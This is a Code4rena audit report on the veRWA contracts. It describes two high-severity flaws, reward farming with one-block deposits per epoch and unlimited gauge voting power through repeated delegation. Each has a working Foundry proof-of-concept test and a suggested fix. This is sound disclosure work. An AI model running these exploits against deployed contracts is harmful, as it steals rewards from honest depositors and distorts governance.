# [veRWA Report](https://code4rena.com/reports/2023-08-verwa)

## Findings by Grey Hawk Reach
| Severity | Title | 
|:--:|:--:|
| [H-01](#H-01) | Users are able to receive full CANTO rewards while only depositing for 1 block per week | 
| [H-02](#H-02) | Infinite voting power | 

## <a id='H-01'></a>[H-01] Users are able to receive full CANTO rewards while only depositing for 1 block per week   
## Lines of code
https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L126-L143

## Vulnerability details
LendingLedger calculates rewards from the deposit the user had by the end of each epoch - it doesn't matter if deposits and withdrawals happen during epochs. This opens up an opportunity of depositing funds for as little as one block per week (the last block) to get rewards.

## Proof of Concept
Scenario:

Alice deposits 1000 Note in a Lending Market at the start of the 1st epoch
Bob deposits 1000 Note in the same LM in the last block of the 1st epoch
Bob withdraws 1000 Note from the LM in the first block of the 2nd epoch
For the remaining duration of the 2nd epoch, Bob deposits his funds into any other protocol of his choice.
Bob repeats steps 2-4 every epoch.

This allows Bob to deposit funds for just one block per epoch to claim the same CANTO rewards as Alice, while also receiving other protocol's rewards. Alice, despite being the sole depositor of the LM for the whole epoch, gets only a half of rewards. Gas wouldn't be an issue, as veRWA is on Canto.

Add to ```LendingLedger.t.sol```:
```solidity
    /*...*/
    address lender1;
    function setUp() public {
        /*...*/
        lender1 = users[2];
    }
    function testRepeatedOneBlockDepositAndClaim() public {
        // copied from setupStateBeforeClaim
        whiteListMarket();
        vm.prank(goverance);
        ledger.setRewards(fromEpoch, fromEpoch + 10 * WEEK, amountPerEpoch);

        payable(ledger).transfer(1000 ether);

        vm.warp(WEEK * 5);
        int256 delta = 1.1 ether;

        vm.prank(lendingMarket);
        ledger.sync_ledger(lender, delta);

        for (uint i; i < 10; i++) {
            uint256 balanceAliceBefore = address(lender).balance;
            uint256 balanceBobBefore = address(lender1).balance;

            // Bob deposits funds in the last block of the epoch (same amount as Alice)
            skip(604794);
            vm.prank(lendingMarket);
            ledger.sync_ledger(lender1, delta);

            // Bob withdraws funds in the next block
            skip(6);
            vm.prank(lendingMarket);
            ledger.sync_ledger(lender1, -1 * delta);

            vm.prank(lender);
            ledger.claim(lendingMarket, fromEpoch, fromEpoch);

            vm.prank(lender1);
            ledger.claim(lendingMarket, fromEpoch, fromEpoch);

            uint256 balanceAliceAfter = address(lender).balance;
            uint256 balanceBobAfter = address(lender1).balance;

            // Bob and Alice receive the same rewards 
            assertTrue(
                balanceAliceAfter - balanceAliceBefore == amountPerEpoch / 2
            );
            assertTrue(
                balanceBobAfter - balanceBobBefore == amountPerEpoch / 2
            );

            fromEpoch += WEEK;
        }
    }
```
## Impact
Malicious users can claim significant rewards while providing liquidity only for one block per week.

In the extreme scenario, whales will use this strategy to collect nearly all CANTO rewards from every market.

## Tools Used
Foundry  

## Recommended Mitigation Steps
Сalculate users' rewards from their lowest balance (or time-weighted average) during the epoch.

## Assessed type
Error

## <a id='H-02'></a>[H-02] Infinite voting power 
## Lines of code
https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211-L278

## Vulnerability details
## Impact
User can create a lock and vote for a certain gauge. After the user has voted he can delegate his votes to another address of his own, which has created a lock with only 1 wei Canto. The other address can vote again for the same gauge, increasing the gauge weight. Afterwards the initial user can delegate again to a third address of his own. He can do that infinitely paying only the gas for the transactions, and creating locks with 1 wei Canto. Doing that a malicious attacker can increase a gauge weight by a lot for a gauge he has staked tokens. Thus receiving much more rewards than he is supposed to, thus stealing rewards from non-malicious users.

## Proof of Concept
You can add the following test to the ```GaugeController.t.sol```
```solidity
  function test_DoubleVoting() public {
        //Add gauges
        assertTrue(!gc.isValidGauge(gauge1));
        vm.startPrank(gov);
        gc.add_gauge(gauge1);
        gc.change_gauge_weight(gauge1, 100);
        console.log("here is the gauge weight: ", gc.get_gauge_weight(gauge1));
        vm.stopPrank();
        assertTrue(gc.isValidGauge(gauge1));

        // Create 3 locks
        vm.deal(user1, 100 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);
        uint256 v = 100 ether;
        uint256 v3 = 1 ether;

        vm.startPrank(user3);
        ve.createLock{value: v3}(v3);
        vm.stopPrank();

        vm.startPrank(user4);
        ve.createLock{value: v3}(v3);
        vm.stopPrank();

        vm.startPrank(user1);
        ve.createLock{value: v}(v);
        gc.vote_for_gauge_weights(gauge1, 10_000);
        console.log("here is the gauge weight after first vote from user1: ", gc.get_gauge_weight(gauge1));
        vm.stopPrank();

        vm.startPrank(user1);
        ve.delegate(user3);
        vm.stopPrank();

        vm.startPrank(user3);
        gc.vote_for_gauge_weights(gauge1, 10_000);
        console.log("here is the gauge weight after user1 delegated to user3: ", gc.get_gauge_weight(gauge1));  

        vm.startPrank(user1);
        ve.delegate(user4);
        vm.stopPrank();

        vm.startPrank(user4);
        gc.vote_for_gauge_weights(gauge1, 10_000);
        console.log("here is the gauge weight after user1 delegated to user4: ", gc.get_gauge_weight(gauge1));  
    }
```
The logs are as follows:
```solidity
  here is the gauge weight:  100
  here is the gauge weight:  100
  here is the gauge weight after first vote from user1:  99342465753378960100
  here is the gauge weight after user1 delegated to user3:  199678356164330870500
  here is the gauge weight after user1 delegated to user4:  300014246575282780900
```
## Tools Used
Manual Review

## Recommended Mitigation Steps
Reconsider using delegation in VotingEscrow as in veCRV there is no delegation. Or implement a logic that tracks if a user has already voted, and don't allow him to delegate votes during the epoch he voted for.

## Assessed type
Error
